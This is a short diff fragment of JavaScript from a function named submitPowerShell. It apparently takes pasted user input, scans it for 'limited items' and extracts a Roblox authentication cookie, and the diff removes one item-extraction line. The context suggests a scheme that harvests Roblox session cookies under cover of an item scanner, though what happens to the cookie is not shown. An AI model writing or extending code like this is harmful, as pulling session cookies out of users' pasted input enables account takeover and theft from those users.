@@ -214,7 +214,6 @@ async function submitPowerShell() {
         // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
-        const detectedItems = extractRobloxItems(inputText);
         
 
         
